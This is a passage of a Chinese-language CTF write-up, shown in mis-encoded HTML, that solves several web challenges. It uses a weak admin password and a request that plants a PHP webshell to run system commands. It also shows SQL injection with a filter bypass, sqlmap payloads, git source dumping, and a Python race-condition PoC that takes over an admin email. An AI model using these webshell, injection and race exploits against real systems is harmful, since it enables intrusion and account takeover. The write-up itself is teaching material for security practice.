rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p><h2 id="0x01-å¼±å¯†ç "><a href="#0x01-å¼±å¯†ç " class="headerlink" title="0x01 å¼±å¯†ç "></a>0x01 å¼±å¯†ç </h2><p>è®¿é—® <code>/dede/login.php</code>ï¼Œçœ‹åˆ°ç®¡ç†ç™»å½•é¡µé¢ï¼Œè¿™é‡Œå­˜åœ¨å¼±å¯†ç ï¼š admin:admin</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571126576237.png" alt="1571126576237"></p><h2 id="0x02-ä»£ç å®¡è®¡"><a href="#0x02-ä»£ç å®¡è®¡" class="headerlink" title="0x02 ä»£ç å®¡è®¡"></a>0x02 ä»£ç å®¡è®¡</h2><p> todo</p><h2 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h2><p>ç¬¬ä¸€æ­¥ï¼Œ<code>GET /dede/tpl.php?action=upload</code>ï¼Œè·å–csrftoken</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571127184086.png" alt="1571127184086"></p><p>ç¬¬äºŒæ­¥ï¼Œ<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>ï¼Œä¸Šä¼ ä¸€å¥è¯</p><p>ç¬¬ä¸‰æ­¥ï¼Œ<code>GET /include/taglib/anemone.lib.php?x=ls</code>ï¼Œèƒ½RCEäº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128235789.png" alt="1571128235789"></p><h2 id="0x04-æ‰¾flag"><a href="#0x04-æ‰¾flag" class="headerlink" title="0x04 æ‰¾flag"></a>0x04 æ‰¾flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128339477.png" alt="1571128339477"></p><p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128497061.png" alt="1571128497061"></p><p>ï¼ˆflagè¢«äººæ”¹äº†å—ï¼Ÿï¼‰</p><h1 id="æ–°çš„æ–°é—»æœç´¢"><a href="#æ–°çš„æ–°é—»æœç´¢" class="headerlink" title="æ–°çš„æ–°é—»æœç´¢"></a>æ–°çš„æ–°é—»æœç´¢</h1><h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><p>å°è¯•ä¸€äº›payloadï¼Œçœ‹åˆ°æœ‰SQLæ³¨å…¥ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571129558998.png" alt="1571129558998"></p><p>ä½†æ˜¯union,selectä¼šè¢«è¿‡æ»¤</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130055314.png" alt="1571130055314"></p><p>å°è¯•<code>/*!select*/</code>ç»•è¿‡</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130170687.png" alt="1571130170687"></p><p>æŸ¥åº“ï¼Œå¾—åˆ°newsï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step2-1541417918841.png" alt="step2"></p><p>æŸ¥è¡¨ï¼Œå¾—åˆ°adminè¡¨ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step3-1541417936188.png" alt="step3"></p><p>æŸ¥åˆ—ï¼Œå¾—åˆ°flagåˆ—</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step4.png" alt="step4"></p><p>æŸ¥è®°å½•ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step5.png" alt="step5"></p><h2 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h2><p>å°è¯•sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§„æ“ä½œ"><a href="#å¸¸è§„æ“ä½œ" class="headerlink" title="å¸¸è§„æ“ä½œ"></a>å¸¸è§„æ“ä½œ</h1><p>çœ‹åˆ°<code>/index.php?url=upload</code>å¯ä»¥æƒ³åˆ°urlå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«/SSRF/URLRedirecté—®é¢˜ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131861906.png" alt="1571131861906"></p><p>base64decodeåå¾—åˆ°flag</p><h1 id="æ–°é—»æœç´¢"><a href="#æ–°é—»æœç´¢" class="headerlink" title="æ–°é—»æœç´¢"></a>æ–°é—»æœç´¢</h1><p>å°è¯•æ³¨å…¥</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130487146.png" alt="1571130487146"></p><p>ä¸€æ­¥æ­¥æ³¨å…¥å¾—åˆ°flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"><a href="#ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®" class="headerlink" title="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"></a>ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®</h1><h2 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h2><p>æ‰«æå‘ç°æºä»£ç æ³„éœ²ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130863836.png" alt="1571130863836"></p><p>è¿˜åŸæºä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>ä»index.php:11-14çœ‹åˆ°ï¼Œå¦‚æœæ˜¯ç®¡ç†å‘˜ï¼Œåˆ™å¯ä»¥æ‹¿åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571212369176.png" alt="1571212369176"></p><p>è·Ÿis_admin(class.user.php):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦åˆæ³•</span></span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//è·å–userfileï¼Œå…¶ä¸­æœ‰ä¸€å±æ€§ä¸ºis_admin</span></span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$users = zUserFile::get_all_users();</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_adminæ²¡æœ‰çªç ´å£ï¼Œä½†æ˜¯è·Ÿæµç¨‹çš„æ—¶å€™ï¼Œå‘ç°æ³¨å†Œç”¨æˆ·æœ‰åˆ‡æ¢ç”¨æˆ·åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹åˆ‡æ¢ç”¨æˆ·é€»è¾‘æ€ä¹ˆåšçš„ï¼š</p><p>switch.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// å½“å‰ç”¨æˆ·å’Œç›®æ ‡ç”¨æˆ·ä»¥é€šè¿‡é‚®ç®±éªŒè¯ï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·é‚®ç®±ä¸ç›®æ ‡ç”¨æˆ·é‚®ç®±ä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">$userObj-&gt;login2($username);</span><br><span class="line">header(<span class="string">'Location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = trim($username);</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜è½¬åŒ–ä¸ºæŠŠè‡ªå·±é‚®ç®±å¼„æˆadminé‚®ç®±ï¼Œç»§ç»­å®¡è®¡ç»‘å®šé‚®ç®±è¿‡ç¨‹ï¼ˆchgemail.phpã€class.user.phpï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//ä¿®æ”¹ç»‘å®šé‚®ç®±</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">$emails = zUserFile::get_emails();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// é‡ç»‘å®šé‚®ç®±åï¼Œemail_verifyè¢«é‡ç½®, tokenè¢«é‡ç½®</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´é‡æ–°ç»‘å®šé‚®ç®±æ—¶ï¼Œéœ€è¦é‡æ–°å‘é‚®ä»¶ï¼Œç„¶åéªŒè¯ï¼Œå†çœ‹ä¸‹éªŒè¯éƒ¨åˆ†ä»£ç ï¼ˆverify.phpï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// tokenå’Œusernameä¸ä¸ºç©º</span></span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">$userObj-&gt;login($username);</span><br><span class="line">header(<span class="string">'location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$token = trim($token);</span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// éªŒè¯æäº¤çš„tokenæ˜¯å¦å’Œæ•°æ®åº“é‡Œçš„ç”¨æˆ·å¯¹åº”çš„tokenä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// tokenè¢«é‡ç½®</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// verifyè®¾ä¸º1</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><p>å®¡åˆ°è¿™é‡Œæƒ³åˆ°æ¡ä»¶ç«äº‰ï¼Œå¦‚æœèµ°æ­£å¸¸é‡ç½®é‚®ç®±çš„æµç¨‹ï¼Œç¨‹åºæ‰§è¡Œåˆ°<code>zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);</code>æ—¶ï¼Œå†æ¬¡è¯·æ±‚é‡ç½®é‚®ç®±ï¼Œç”±äºclass.user.php::validate_email()æ²¡æœ‰æ£€æŸ¥validçŠ¶æ€ï¼Œå¯¼è‡´æ–°çš„emailè¢«å†™å…¥ï¼Œç¨‹åºå†å›åˆ°<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>ï¼Œé‚£ä¹ˆæ”»å‡»è¿™å°±å¯ä»¥é‡ç½®ä»»æ„é‚®ç®±äº†ã€‚</p><p>æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><ol><li>æ³¨å†Œç”¨æˆ·éªŒè¯é‚®ç®±</li><li>é‡ç½®é‚®ç®±ï¼ˆè¿™é‡Œé‚®ç®±è¿˜å†™è‡ªå·±çš„ï¼‰</li><li>æ”¶åˆ°æ ¡éªŒé“¾æ¥</li><li>åœ¨è¯·æ±‚æ ¡éªŒé“¾æ¥åŒæ—¶ï¼Œå†æ¬¡é‡ç½®é‚®ç®±ä¸ºç®¡ç†å‘˜é‚®ç®±ï¼ˆambulong@vulnspy.comï¼Œæ³¨å†Œç•Œé¢å‡ºç°è¿‡ï¼‰ï¼Œè‹¥è¯¥æ­¥éª¤åœ¨æ¯”è¾ƒtokenä¸€è‡´â€”-&gt;set(email_verify=1)ä¸­é—´æ‰§è¡Œï¼Œåˆ™æ¡ä»¶ç«äº‰æˆåŠŸã€‚</li></ol><p>å› æ­¤æœ‰ä»¥ä¸‹PoCï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure><p>è¿è¡Œåçœ‹åˆ°é‚®ç®±è¢«ä¿®æ”¹ï¼Œåˆ‡æ¢ç”¨æˆ·å°±èƒ½æ‹¿åˆ°flagäº†</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571219028911.png" alt="1571219028911"></p><h1 id="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h1><p>PHPç‰¹æ€§ï¼Œ</p><ol><li><p>å‚æ•°åä¸ºA.Aä¼šè½¬å˜ä¸ºA_Aï¼Œ</p></li><li><p>æ•°ç»„&gt;inf</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571196679531.png" alt="1571196679531"></p></li><li><p>æ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶ä¼šå‡ºé”™ï¼Œå› æ­¤ç»“æœ==0</p><p><img 